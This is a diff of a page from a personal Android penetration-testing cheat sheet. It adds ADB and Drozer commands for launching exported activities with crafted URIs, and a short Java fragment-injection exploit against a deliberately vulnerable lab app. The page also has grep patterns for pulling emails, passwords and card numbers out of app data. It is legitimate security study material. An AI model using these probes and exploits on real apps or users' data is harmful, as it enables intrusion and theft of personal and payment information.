@@ -151,6 +151,10 @@
   <ul>
     
     <li class="">
+      <a href="https://bakerst221b.com/docs/articles/mobile/android/complex-attacks/">Complex Attacks</a>
+    </li>
+    
+    <li class="">
       <a href="https://bakerst221b.com/docs/blog/2018/04/dot-net-confuser/">.NET Confuser</a>
     </li>
     
@@ -264,7 +268,12 @@
 <h1 class="title">Rtfm Android</h1>
 <div class="content ">
   <h2 id="adb">ADB</h2>
-<p>Over USB:</p>
+<p>On mobile <a href="https://tunesgo.wondershare.com/android/enable-android-developer-options.html?gclid=EAIaIQobChMI5qTXtM3c6wIViqkYCh3TOQy4EAAYASAAEgIZsvD_BwE">enable</a> developer&rsquo;s mode and USB debugging. Trust the PC with adb when prompted on mobile.</p>
+<p>Usefull commands:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb install <span class="o">[</span>appname<span class="o">]</span>.apk
+adb devices
+adb kill-server
+</code></pre></div><p>Over USB:</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb devices
 adb shell
 su
@@ -278,6 +287,7 @@ adb kill-server
 adb tcpip <span class="m">5555</span> <span class="c1"># start adb in tcpip mode</span>
 adb connect <span class="o">[</span>mobile_IP<span class="o">]</span>:5555 <span class="c1"># disconnect USB before that</span>
 adb shell <span class="c1"># to check</span>
+adb usb <span class="c1"># disable tcpip mode</span>
 </code></pre></div><h2 id="jdb">JDB</h2>
 <p>Useful to <a href="https://www.youtube.com/watch?v=fVZXeZ07tS4">watch</a> regarding debugging in Android applications.</p>
 <p>Get PID list:</p>
@@ -335,7 +345,8 @@ run app.activity.start --component <span class="o">[</span>package_name<span cla
 </code></pre></div><p>Attacks on broadcast receivers:</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run app.broadcast.info -a com.android.insecurebankv2
 </code></pre></div><p>Custom URL Schemes:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run scanner.activity.browsable -a <span class="o">[</span>package_name<span class="o">]</span>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run scanner.activity.browsable -a <span class="o">[</span>package_name<span class="o">]</span> <span class="c1"># to find browsable activities</span>
+dz&gt; run app.activity.start  --action android.intent.action.VIEW --data-uri <span class="s2">&#34;sms://0123456789&#34;</span> <span class="c1"># to launch such activity with parameters passed</span>
 </code></pre></div><p>Attacks on content providers:</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run scanner.provider.finduris -a <span class="o">[</span>package_name<span class="o">]</span>
 run app.provider.query content://<span class="o">[</span>URI_to_the_content<span class="o">]</span>
@@ -408,6 +419,15 @@ grep -r -E -o <span class="s2">&#34;\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]
 grep <span class="o">[</span>login<span class="o">]</span> <span class="p">|</span> <span class="o">[</span>password<span class="o">]</span> <span class="c1"># logins/passwords etc</span>
 grep -r -E -o <span class="s2">&#34;4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}&#34;</span> .  <span class="c1"># visa cards numbers</span>
 mstercard grep -r -E -o <span class="s2">&#34;5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}&#34;</span> . <span class="c1"># mastercard</span>
+</code></pre></div><h2 id="expoits">Expoits</h2>
+<h3 id="fragment-injection">Fragment injection</h3>
+<p>sdk &lt; 19:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
+<span class="n">i</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_ACTIVITY_CLEAR_TASK</span><span class="o">);</span>
+<span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">&#34;pt.claudio.insecurefragment&#34;</span><span class="o">,</span><span class="s">&#34;pt.claudio.insecurefragment.MainActivity&#34;</span><span class="o">);</span>
+<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&#34;:android:show_fragment&#34;</span><span class="o">,</span><span class="s">&#34;pt.claudio.insecurefragment.MyFragment&#34;</span><span class="o">);</span>
+<span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">&#34;https://security.claudio.pt&#34;</span><span class="o">));</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span> <span class="err">#</span> <span class="n">here</span> <span class="n">is</span> <span class="n">supposed</span> <span class="n">to</span> <span class="n">be</span> <span class="n">the</span> <span class="n">malicious</span> <span class="n">data</span> <span class="n">passed</span>
 </code></pre></div>
 </div>
 </div>
